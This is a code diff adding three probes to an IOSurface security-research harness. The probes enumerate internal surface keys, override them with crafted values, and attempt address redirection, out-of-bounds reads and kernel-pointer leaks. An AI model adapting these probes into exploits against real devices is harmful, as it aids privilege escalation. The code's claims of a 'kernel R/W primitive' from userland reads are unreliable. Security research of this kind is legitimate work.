@@ -14618,3 +14618,586 @@ void iosurface_research_id_reuse(ISRLogBlock log, ISRDoneBlock done) {
         }
     });
 }
+
+#pragma mark - Probe 67: Key Enum
+
+void iosurface_research_key_enum(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"KEYENUM: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"KEYENUM: Starting internal key enumeration");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            unsigned anomalies = 0;
+
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            int readableCount = 0;
+            int addressLikeCount = 0;
+            NSMutableArray *readableKeys = [NSMutableArray array];
+
+            NSDictionary *params = isr_default_surface_params(64, 64);
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
+
+            if (!surf || !copyValue) {
+                log(@"KEYENUM: Failed to create surface or load CopyValue");
+                if (surf) CFRelease(surf);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            sym.lock(surf, 0, NULL);
+            sym.unlock(surf, 0, NULL);
+
+            NSArray *keys = @[
+                @"IOSurfaceAddress", @"IOSurfaceAllocSize", @"IOSurfaceBytesPerElement",
+                @"IOSurfaceBytesPerRow", @"IOSurfaceWidth", @"IOSurfaceHeight",
+                @"IOSurfacePixelFormat", @"IOSurfaceOffset", @"IOSurfacePlaneInfo",
+                @"IOSurfacePlaneSize", @"IOSurfacePlaneBytesPerRow", @"IOSurfacePlaneOffset",
+                @"IOSurfacePlaneBase", @"IOSurfaceCacheMode", @"IOSurfaceIsGlobal",
+                @"IOSurfaceClientAddress", @"IOSurfaceMapOffset", @"IOSurfaceMipmapLevel",
+                @"IOSurfaceElementWidth", @"IOSurfaceElementHeight", @"IOSurfaceAllocSizeOrig",
+                @"IOSurfacePurgeWhenNotInUse", @"IOSurfacePlaneWidth", @"IOSurfacePlaneHeight",
+                @"IOSurfaceICCProfile", @"IOSurfaceColorSpace", @"IOSurfaceSubsampling"
+            ];
+
+            if (!isr_stopped()) {
+                log(@"KEYENUM: Step 1 — Enumerate all internal keys");
+
+                for (NSString *key in keys) {
+                    if (isr_stopped()) break;
+
+                    CFTypeRef val = copyValue(surf, (__bridge CFStringRef)key);
+                    if (val) {
+                        readableCount++;
+                        [readableKeys addObject:key];
+                        CFTypeID tid = CFGetTypeID(val);
+
+                        if (tid == CFNumberGetTypeID()) {
+                            int64_t num = 0;
+                            CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &num);
+                            NSString *flag = @"";
+                            if (num > 0x100000000ULL) {
+                                flag = @" [ADDRESS-LIKE]";
+                                addressLikeCount++;
+                                anomalies++;
+                            }
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %lld (0x%llX) [Number]%@",
+                                 key, (long long)num, (unsigned long long)num, flag]);
+                        } else if (tid == CFDataGetTypeID()) {
+                            NSData *data = (__bridge NSData *)val;
+                            NSUInteger len = data.length;
+                            const uint8_t *bytes = data.bytes;
+                            NSMutableString *hex = [NSMutableString string];
+                            for (NSUInteger i = 0; i < MIN(len, 16); i++) {
+                                [hex appendFormat:@"%02X", bytes[i]];
+                            }
+                            if (len > 16) [hex appendString:@"..."];
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = <%lu bytes> %@ [Data]",
+                                 key, (unsigned long)len, hex]);
+                        } else if (tid == CFStringGetTypeID()) {
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %@ [String]",
+                                 key, (__bridge NSString *)val]);
+                        } else if (tid == CFBooleanGetTypeID()) {
+                            BOOL b = CFBooleanGetValue((CFBooleanRef)val);
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %@ [Bool]",
+                                 key, b ? @"YES" : @"NO"]);
+                        } else if (tid == CFDictionaryGetTypeID()) {
+                            CFIndex count = CFDictionaryGetCount((CFDictionaryRef)val);
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = {dict %ld keys} [Dict]",
+                                 key, (long)count]);
+                        } else if (tid == CFArrayGetTypeID()) {
+                            CFIndex count = CFArrayGetCount((CFArrayRef)val);
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = [array %ld items] [Array]",
+                                 key, (long)count]);
+                        } else {
+                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = <CFTypeID=%lu> [Unknown]",
+                                 key, (unsigned long)tid]);
+                        }
+                        CFRelease(val);
+                    } else {
+                        log([NSString stringWithFormat:@"KEYENUM: ✗ %@ = nil", key]);
+                    }
+                }
+
+                log([NSString stringWithFormat:@"KEYENUM: Readable keys: %d/%lu, address-like: %d",
+                     readableCount, (unsigned long)keys.count, addressLikeCount]);
+
+            } // end step 1
+
+            CFRelease(surf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"KEYENUM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (addressLikeCount >= 3) verdict = @"HIGH — multiple address-like values exposed via API";
+            else if (addressLikeCount >= 1) verdict = @"MEDIUM — address-like values found in keys";
+            else if (readableCount >= 15) verdict = @"MEDIUM — extensive internal state readable";
+            else if (readableCount >= 5) verdict = @"LOW — some internal keys readable";
+            else verdict = @"LOW — minimal key access";
+            log([NSString stringWithFormat:@"KEYENUM: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"readableKeys": @(readableCount),
+                @"addressLikeKeys": @(addressLikeCount)
+            };
+            isr_checkpoint(@"ISR-KeyEnum-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 68: Key Override
+
+void iosurface_research_key_override(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"KEYOVERRIDE: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"KEYOVERRIDE: Starting internal key override test");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            unsigned anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            int behaviorChanges = 0;
+            int baseChanges = 0;
+            int sizeChanges = 0;
+            NSMutableArray *effectiveKeys = [NSMutableArray array];
+
+            NSDictionary *params = isr_default_surface_params(64, 64);
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
+
+            if (!surf || !setValue || !copyValue) {
+                log(@"KEYOVERRIDE: Failed to create surface or load functions");
+                if (surf) CFRelease(surf);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            sym.lock(surf, 0, NULL);
+            void *origBase = sym.getBase(surf);
+            size_t origWidth = sym.getWidth(surf);
+            size_t origHeight = sym.getHeight(surf);
+            size_t origBpr = sym.getBytesPerRow(surf);
+            size_t origAlloc = sym.getAllocSize(surf);
+            sym.unlock(surf, 0, NULL);
+
+            log([NSString stringWithFormat:@"KEYOVERRIDE: Original — base=%p w=%zu h=%zu bpr=%zu alloc=%zu",
+                 origBase, origWidth, origHeight, origBpr, origAlloc]);
+
+            NSArray *testKeys = @[
+                @"IOSurfaceAllocSize", @"IOSurfaceBytesPerRow", @"IOSurfaceWidth",
+                @"IOSurfaceHeight", @"IOSurfacePixelFormat", @"IOSurfaceOffset",
+                @"IOSurfaceBytesPerElement", @"IOSurfaceCacheMode",
+                @"IOSurfaceAddress", @"IOSurfaceClientAddress", @"IOSurfaceMapOffset",
+                @"IOSurfaceElementWidth", @"IOSurfaceElementHeight",
+                @"IOSurfaceAllocSizeOrig", @"IOSurfaceIsGlobal",
+                @"IOSurfacePurgeWhenNotInUse", @"IOSurfaceSubsampling"
+            ];
+
+            if (!isr_stopped()) {
+                log(@"KEYOVERRIDE: Step 1 — Override each key and check behavior changes");
+
+                for (NSString *key in testKeys) {
+                    if (isr_stopped()) break;
+
+                    CFTypeRef origVal = copyValue(surf, (__bridge CFStringRef)key);
+
+                    int64_t overrideVal = 99999;
+                    if ([key containsString:@"Address"] || [key containsString:@"MapOffset"]) {
+                        overrideVal = 0x41414141000ULL;
+                    } else if ([key containsString:@"Size"] || [key containsString:@"Alloc"]) {
+                        overrideVal = 1048576;
+                    } else if ([key containsString:@"Width"] || [key containsString:@"Height"]) {
+                        overrideVal = 4096;
+                    } else if ([key containsString:@"BytesPerRow"]) {
+                        overrideVal = 65536;
+                    }
+
+                    setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(overrideVal));
+
+                    sym.lock(surf, 0, NULL);
+                    void *newBase = sym.getBase(surf);
+                    size_t newWidth = sym.getWidth(surf);
+                    size_t newHeight = sym.getHeight(surf);
+                    size_t newBpr = sym.getBytesPerRow(surf);
+                    size_t newAlloc = sym.getAllocSize(surf);
+                    sym.unlock(surf, 0, NULL);
+
+                    BOOL changed = NO;
+                    NSMutableString *changes = [NSMutableString string];
+
+                    if (newBase != origBase) {
+                        [changes appendFormat:@"BASE %p→%p ", origBase, newBase];
+                        baseChanges++;
+                        changed = YES;
+                    }
+                    if (newWidth != origWidth) {
+                        [changes appendFormat:@"W %zu→%zu ", origWidth, newWidth];
+                        changed = YES;
+                    }
+                    if (newHeight != origHeight) {
+                        [changes appendFormat:@"H %zu→%zu ", origHeight, newHeight];
+                        changed = YES;
+                    }
+                    if (newBpr != origBpr) {
+                        [changes appendFormat:@"BPR %zu→%zu ", origBpr, newBpr];
+                        changed = YES;
+                    }
+                    if (newAlloc != origAlloc) {
+                        [changes appendFormat:@"ALLOC %zu→%zu ", origAlloc, newAlloc];
+                        sizeChanges++;
+                        changed = YES;
+                    }
+
+                    if (changed) {
+                        behaviorChanges++;
+                        anomalies++;
+                        [effectiveKeys addObject:key];
+                        NSString *severity = (baseChanges > 0) ? @"*** CRITICAL" : @"*** HIGH";
+                        log([NSString stringWithFormat:@"KEYOVERRIDE: %@ %@ → %@ ***",
+                             severity, key, changes]);
+                    } else {
+                        log([NSString stringWithFormat:@"KEYOVERRIDE: %@ → no observable change", key]);
+                    }
+
+                    if (origVal) {
+                        setValue(surf, (__bridge CFStringRef)key, origVal);
+                        CFRelease(origVal);
+                    } else {
+                        setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(0));
+                    }
+                }
+
+                log([NSString stringWithFormat:@"KEYOVERRIDE: Behavior changes: %d, base changes: %d, size changes: %d",
+                     behaviorChanges, baseChanges, sizeChanges]);
+
+            } // end step 1
+
+            CFRelease(surf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"KEYOVERRIDE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (baseChanges > 0) verdict = @"CRITICAL — base address changed via key override! Potential kernel R/W";
+            else if (sizeChanges > 0) verdict = @"HIGH — allocation size changed, potential OOB primitive";
+            else if (behaviorChanges >= 3) verdict = @"HIGH — multiple observable behavior changes";
+            else if (behaviorChanges >= 1) verdict = @"MEDIUM — some key overrides affect behavior";
+            else verdict = @"LOW — no observable behavior changes from key overrides";
+            log([NSString stringWithFormat:@"KEYOVERRIDE: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"behaviorChanges": @(behaviorChanges),
+                @"baseChanges": @(baseChanges),
+                @"sizeChanges": @(sizeChanges),
+                @"effectiveKeys": effectiveKeys
+            };
+            isr_checkpoint(@"ISR-KeyOverride-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 69: Address Redirect
+
+void iosurface_research_addr_redirect(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"ADDREDIR: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"ADDREDIR: Starting address redirect via internal key manipulation");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            unsigned anomalies = 0;
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            int redirectSuccess = 0;
+            int oobSuccess = 0;
+            int crossRead = 0;
+
+            NSDictionary *paramsA = isr_default_surface_params(64, 64);
+            NSDictionary *paramsB = isr_default_surface_params(128, 128);
+            IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)paramsA);
+            IOSurfaceRef surfB = sym.create((__bridge CFDictionaryRef)paramsB);
+
+            if (!surfA || !surfB || !setValue || !copyValue) {
+                log(@"ADDREDIR: Failed to create surfaces or load functions");
+                if (surfA) CFRelease(surfA);
+                if (surfB) CFRelease(surfB);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            sym.lock(surfA, 0, NULL);
+            sym.lock(surfB, 0, NULL);
+            void *baseA = sym.getBase(surfA);
+            void *baseB = sym.getBase(surfB);
+            size_t allocA = sym.getAllocSize(surfA);
+            size_t allocB = sym.getAllocSize(surfB);
+
+            memset(baseA, 0xAA, allocA);
+            memset(baseB, 0xBB, allocB);
+            sym.unlock(surfA, 0, NULL);
+            sym.unlock(surfB, 0, NULL);
+
+            log([NSString stringWithFormat:@"ADDREDIR: Surface A base=%p alloc=%zu (filled 0xAA)", baseA, allocA]);
+            log([NSString stringWithFormat:@"ADDREDIR: Surface B base=%p alloc=%zu (filled 0xBB)", baseB, allocB]);
+
+            // Step 1: Try address keys to redirect A → B
+            if (!isr_stopped()) {
+                log(@"ADDREDIR: Step 1 — Try address key overrides to redirect surface A mapping");
+
+                NSArray *addrKeys = @[@"IOSurfaceAddress", @"IOSurfaceClientAddress", @"IOSurfaceMapOffset"];
+
+                for (NSString *key in addrKeys) {
+                    if (isr_stopped()) break;
+
+                    CFTypeRef origVal = copyValue(surfA, (__bridge CFStringRef)key);
+                    uint64_t targetAddr = (uint64_t)(uintptr_t)baseB;
+
+                    setValue(surfA, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(targetAddr));
+                    log([NSString stringWithFormat:@"ADDREDIR: Set %@ = 0x%llX (surfB base)", key, targetAddr]);
+
+                    sym.lock(surfA, 0, NULL);
+                    void *newBaseA = sym.getBase(surfA);
+
+                    uint8_t readBuf[16];
+                    memset(readBuf, 0, sizeof(readBuf));
+                    vm_size_t outSize = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                                         (vm_address_t)newBaseA, sizeof(readBuf),
+                                                         (vm_address_t)readBuf, &outSize);
+
+                    BOOL hasRedirect = NO;
+                    if (kr == KERN_SUCCESS && outSize > 0) {
+                        int bbCount = 0;
+                        for (int i = 0; i < (int)outSize; i++) {
+                            if (readBuf[i] == 0xBB) bbCount++;
+                        }
+                        if (bbCount > 8) {
+                            hasRedirect = YES;
+                            redirectSuccess++;
+                            anomalies += 10;
+                            log([NSString stringWithFormat:@"ADDREDIR: *** CRITICAL — %@ redirected A to B! Read 0xBB x%d ***",
+                                 key, bbCount]);
+                        } else if (newBaseA != baseA) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"ADDREDIR: *** HIGH — %@ changed base %p→%p but data not B's ***",
+                                 key, baseA, newBaseA]);
+                        } else {
+                            log([NSString stringWithFormat:@"ADDREDIR: %@ — base unchanged, read[0]=0x%02X", key, readBuf[0]]);
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"ADDREDIR: %@ — vm_read failed kr=%d", key, kr]);
+                    }
+
+                    sym.unlock(surfA, 0, NULL);
+
+                    if (origVal) {
+                        setValue(surfA, (__bridge CFStringRef)key, origVal);
+                        CFRelease(origVal);
+                    }
+
+                    if (hasRedirect) break;
+                }
+
+            } // end step 1
+
+            // Step 2: Try size inflation for OOB
+            if (!isr_stopped()) {
+                log(@"ADDREDIR: Step 2 — Inflate IOSurfaceAllocSize for OOB read");
+
+                CFTypeRef origAlloc = copyValue(surfA, CFSTR("IOSurfaceAllocSize"));
+
+                setValue(surfA, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(1048576));
+
+                size_t newAllocA = sym.getAllocSize(surfA);
+                log([NSString stringWithFormat:@"ADDREDIR: AllocSize after override: %zu (was %zu)", newAllocA, allocA]);
+
+                if (newAllocA > allocA) {
+                    anomalies++;
+                    oobSuccess++;
+                    log(@"ADDREDIR: *** HIGH — AllocSize inflated! Attempting OOB read ***");
+
+                    sym.lock(surfA, 0, NULL);
+                    void *curBase = sym.getBase(surfA);
+
+                    uint8_t oobBuf[64];
+                    memset(oobBuf, 0, sizeof(oobBuf));
+                    vm_size_t oobOut = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                                         (vm_address_t)curBase + allocA, sizeof(oobBuf),
+                                                         (vm_address_t)oobBuf, &oobOut);
+
+                    if (kr == KERN_SUCCESS && oobOut > 0) {
+                        anomalies++;
+                        int nonzero = 0;
+                        for (int i = 0; i < (int)oobOut; i++) {
+                            if (oobBuf[i] != 0) nonzero++;
+                        }
+                        log([NSString stringWithFormat:@"ADDREDIR: *** OOB READ SUCCESS — %zu bytes past boundary, %d nonzero ***",
+                             oobOut, nonzero]);
+
+                        uint64_t *qwords = (uint64_t *)oobBuf;
+                        for (int q = 0; q < (int)(oobOut / 8); q++) {
+                            if (qwords[q] > 0xFFFFFF8000000000ULL && qwords[q] < 0xFFFFFFFFFFFFFFFFULL) {
+                                anomalies += 5;
+                                log([NSString stringWithFormat:@"ADDREDIR: *** KERNEL PTR at OOB+%d = 0x%016llX ***",
+                                     q * 8, (unsigned long long)qwords[q]]);
+                            }
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"ADDREDIR: OOB read failed kr=%d", kr]);
+                    }
+
+                    sym.unlock(surfA, 0, NULL);
+                } else {
+                    log(@"ADDREDIR: AllocSize unchanged — kernel ignores override");
+                }
+
+                if (origAlloc) {
+                    setValue(surfA, CFSTR("IOSurfaceAllocSize"), origAlloc);
+                    CFRelease(origAlloc);
+                }
+
+            } // end step 2
+
+            // Step 3: Try offset manipulation
+            if (!isr_stopped()) {
+                log(@"ADDREDIR: Step 3 — Manipulate IOSurfaceOffset to shift mapped region");
+
+                setValue(surfA, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@(4096));
+
+                sym.lock(surfA, 0, NULL);
+                void *offsetBase = sym.getBase(surfA);
+                sym.unlock(surfA, 0, NULL);
+
+                if (offsetBase != baseA) {
+                    anomalies++;
+                    crossRead++;
+                    log([NSString stringWithFormat:@"ADDREDIR: *** HIGH — Offset shifted base %p→%p (delta=%ld) ***",
+                         baseA, offsetBase, (long)((intptr_t)offsetBase - (intptr_t)baseA)]);
+                } else {
+                    log(@"ADDREDIR: Offset override — base unchanged");
+                }
+
+                setValue(surfA, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@(0));
+
+            } // end step 3
+
+            // Step 4: Cross-surface read via BytesPerRow inflation
+            if (!isr_stopped()) {
+                log(@"ADDREDIR: Step 4 — BytesPerRow inflation + vm_read to reach surface B");
+
+                setValue(surfA, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(131072));
+
+                sym.lock(surfA, 0, NULL);
+                void *curBase = sym.getBase(surfA);
+                ptrdiff_t dist = (intptr_t)baseB - (intptr_t)curBase;
+                log([NSString stringWithFormat:@"ADDREDIR: Distance A→B = %td bytes", dist]);
+
+                if (dist > 0 && dist < 10000000) {
+                    uint8_t crossBuf[16];
+                    memset(crossBuf, 0, sizeof(crossBuf));
+                    vm_size_t crossOut = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                                         (vm_address_t)curBase + dist, sizeof(crossBuf),
+                                                         (vm_address_t)crossBuf, &crossOut);
+
+                    if (kr == KERN_SUCCESS && crossOut > 0) {
+                        int bbCount = 0;
+                        for (int i = 0; i < (int)crossOut; i++) {
+                            if (crossBuf[i] == 0xBB) bbCount++;
+                        }
+                        if (bbCount > 8) {
+                            crossRead++;
+                            anomalies += 3;
+                            log([NSString stringWithFormat:@"ADDREDIR: *** CROSS-READ HIT — read surface B data (0xBB x%d) via stride ***",
+                                 bbCount]);
+                        } else {
+                            log([NSString stringWithFormat:@"ADDREDIR: Cross-read got data but not B's (byte0=0x%02X)", crossBuf[0]]);
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"ADDREDIR: Cross-read failed kr=%d (distance may be too far)", kr]);
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"ADDREDIR: Distance A→B = %td — not suitable for cross-read", dist]);
+                }
+
+                sym.unlock(surfA, 0, NULL);
+                setValue(surfA, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(256));
+
+            } // end step 4
+
+            CFRelease(surfA);
+            CFRelease(surfB);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"ADDREDIR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (redirectSuccess > 0) verdict = @"CRITICAL — address redirect achieved! Kernel R/W primitive available";
+            else if (oobSuccess > 0 && crossRead > 0) verdict = @"HIGH — size inflation + cross-surface read confirmed";
+            else if (oobSuccess > 0) verdict = @"HIGH — allocation size inflation enables OOB";
+            else if (crossRead > 0) verdict = @"MEDIUM — cross-surface data readable via stride";
+            else if (anomalies >= 2) verdict = @"MEDIUM — some key overrides affect mapping";
+            else if (anomalies >= 1) verdict = @"LOW — minimal effect from key overrides";
+            else verdict = @"LOW — no address redirect achieved";
+            log([NSString stringWithFormat:@"ADDREDIR: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"redirectSuccess": @(redirectSuccess),
+                @"oobSuccess": @(oobSuccess),
+                @"crossRead": @(crossRead)
+            };
+            isr_checkpoint(@"ISR-AddrRedirect-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
